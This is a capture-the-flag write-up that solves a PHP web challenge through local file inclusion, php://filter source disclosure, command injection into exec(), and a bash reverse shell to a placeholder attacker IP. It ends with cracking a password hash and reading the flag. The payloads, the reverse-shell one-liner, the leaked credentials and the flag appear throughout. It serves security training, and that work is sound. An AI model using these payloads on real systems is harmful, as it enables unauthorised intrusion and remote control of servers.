# Web Hacking Challenge 3

## Description

Web Hacking.

## Exploit

First, when you visit the website, you get redirected to `/?file=wc.php`. This might indicate that you can include files from the server, such as `/?file=/etc/passwd`. You can see in this file that there's a user called `ctf`, but that's not useful yet. Moving on, you can find out that there's a `robots.txt` file at `?file=robots.txt`.

```
Disallow: /?file=checkpass.php
```

Visiting that URL, you get redirected back to `/wc.php`. However, it maybe that there's some code in `checkpass.php` that might be important. If you request it in `python`, you can see:

```python
>>> r = requests.get('http://IP:30300?file=checkpass.php', allow_redirects=False)
>>> r.text
'IMPORTANT!!! The page is still under development. This has a secret, do not push this page.'
```

We can try to view the source of this page with the help of `php://filter`. Visit the website:

```
/?file=php://filter/convert.base64-encode/resource=checkpass.php

PD9waHAKJHBhc3N3b3JkID0gIm15UWZRRENTaFJHcUg0IjsKLy8gQ29va2llIHBhc3N3b3JkLgplY2hvICJJTVBPUlRBTlQhISEgVGhlIHBhZ2UgaXMgc3RpbGwgdW5kZXIgZGV2ZWxvcG1lbnQuIFRoaXMgaGFzIGEgc2VjcmV0LCBkbyBub3QgcHVzaCB0aGlzIHBhZ2UuIjsKCmhlYWRlcignTG9jYXRpb246IC8nKTsK
```

When you base64 decode this, you get:

```
<?php
$password = "myQfQDCShRGqH4";
// Cookie password.
echo "IMPORTANT!!! The page is still under development. This has a secret, do not push this page.";

header('Location: /');
```

So, we can see a suspicious `$password` variable. Let's also check the source for `wc.php`. 
GET http://IP:30300//?file=php://filter/convert.base64-encode/resource=wc.php

```
PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KCjxoZWFkPgogICAgPG1ldGEgY2hhcnNldD0iVVRGLTgiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPgogICAgPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJpZT1lZGdlIj4KICAgIDx0aXRsZT53YyBhcyBhIHNlcnZpY2U8L3RpdGxlPgogICAgPHN0eWxlPgogICAgICAgIGh0bWwsCiAgICAgICAgYm9keSB7CiAgICAgICAgICAgIG92ZXJmbG93OiBub25lOwogICAgICAgICAgICBtYXgtaGVpZ2h0OiAxMDB2aDsKICAgICAgICB9CiAgICA8L3N0eWxlPgo8L2hlYWQ+Cgo8Ym9keSBzdHlsZT0iaGVpZ2h0OiAxMDB2aDsgdGV4dC1hbGlnbjogY2VudGVyOyBiYWNrZ3JvdW5kLWNvbG9yOiBibGFjazsgY29sb3I6IHdoaXRlOyBkaXNwbGF5OiBmbGV4OyBmbGV4LWRpcmVjdGlvbjogY29sdW1uOyBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsiPgogICAgPD9waHAKICAgIGluaV9zZXQoJ21heF9leGVjdXRpb25fdGltZScsIDUpOwogICAgaWYgKCRfQ09PS0lFWydwYXNzd29yZCddICE9PSBnZXRlbnYoJ1BBU1NXT1JEJykpIHsKICAgICAgICBzZXRjb29raWUoJ3Bhc3N3b3JkJywgJ1BBU1NXT1JEJyk7CiAgICAgICAgZGllKCdTb3JyeSwgb25seSBwZW9wbGUgZnJvbSBBbHRpY2UgTGFicyBhcmUgYWxsb3dlZCB0byBhY2Nlc3MgdGhpcyBwYWdlLicpOwogICAgfQogICAgPz4KCiAgICA8aDE+Q2hhcmFjdGVyIENvdW50IGFzIGEgU2VydmljZTwvaDE+CiAgICA8Zm9ybT4KICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiB2YWx1ZT0id2MucGhwIiBuYW1lPSJmaWxlIj4KICAgICAgICA8dGV4dGFyZWEgc3R5bGU9ImJvcmRlci1yYWRpdXM6IDFyZW07IiB0eXBlPSJ0ZXh0IiBuYW1lPSJ0ZXh0IiByb3dzPTMwIGNvbHM9MTAwPjwvdGV4dGFyZWE+PGJyIC8+CiAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCI+CiAgICA8L2Zvcm0+CiAgICA8P3BocAogICAgaWYgKGlzc2V0KCRfR0VUWyJ0ZXh0Il0pKSB7CiAgICAgICAgJHRleHQgPSAkX0dFVFsidGV4dCJdOwogICAgICAgIGVjaG8gIjxoMj5UaGUgQ2hhcmFjdGVyIENvdW50IGlzOiAiIC4gZXhlYygncHJpbnRmIFwnJyAuICR0ZXh0IC4gJ1wnIHwgd2MgLWMnKSAuICI8L2gyPiI7CiAgICB9CiAgICA/Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==
```

Here, you can see that a `password` cookie is being checked. Enter the password from the `$password` variable as the cookie (`myQfQDCShRGqH4`), then you can see the webpage.
<br />

You also see in the source of `wc.php` that the input `$text` is obtained from the get param `text`, and is passed into `exec`. 
So, we can get remote code execution from here! Try with the payload:

```
'; ls #
```

You can see the following output:

```
The Character Count is: wc.php
```

But, we know for a fact that there's also `robots.txt` and `checkpass.php` in this folder. You then findout that `echo exec(...)` returns only the last line of the output. We have 2 choices from here. Either we do `'; <command> | tr '\n' '' #` to replace all new-lines with spaces, throughout the rest of the exploit. Otherwise, you can try to spawn a reverse shell, and then use your server to navigate through the directories. I'm going to use the `reverse shell` method.

```
'; bash -c "bash -i >& /dev/tcp/your.server.ip.address/8000 0>&1" #
```
Open nc to listen on port 8000 

> Note: Replace `your.server.ip.address` with your server's IP.

Once you pass this in the input, you get a shell on your server!

```bash
www-data@9c9f6ae73053:/var/www/html$ ls      
ls
checkpass.php
index.php
robots.txt
wc.php
www-data@9c9f6ae73053:/var/www/html$ 
```

Let's navigate through the file system and see if there's something interesting. You can see there's a folder `/ctf`. Inside that, there are a lot of folders.

```bash
www-data@9c9f6ae73053:/ctf$ ls
ls
README
avenged
dream
findaas
led
system
www-data@9c9f6ae73053:/ctf$ 
```

There's also a `findaas` bash script, which you can use to locate `flag.txt` (or you can use the find command directly).

```bash
www-data@9c9f6ae73053:/ctf$ ./findaas flag.txt
./findaas flag.txt
Enter a filename and find it here!
./system/of/a/down/flag.txt
www-data@9c9f6ae73053:/ctf$ 
```

Now that you know where the flag is, you can just cat the flag!

```
www-data@9c9f6ae73053:/ctf$ cat ./system/of/a/down/flag.txt
cat ./system/of/a/down/flag.txt
cat: ./system/of/a/down/flag.txt: Permission denied
www-data@9c9f6ae73053:/ctf$ 
```

But there's a catch. You don't have permission to cat the flag. However, when you see the `README` file, it says that the password hash for `ctf` is `be4f704f5b05783518b9555dac7144df`. You can bruteforce that using offline tools or using [crackstation.net](https://crackstation.net/), and find out that the password is `altice` (maybe you could've guessed it too). Now, you can just switch to the user `ctf` and print the flag!

```bash
www-data@9c9f6ae73053:/ctf$ su ctf
su ctf
Password: altice
cat ./system/of/a/down/flag.txt
alticectf{1nj3cc40_3h_c0mpl1c4d4}
```

Congrats! You have found the flag.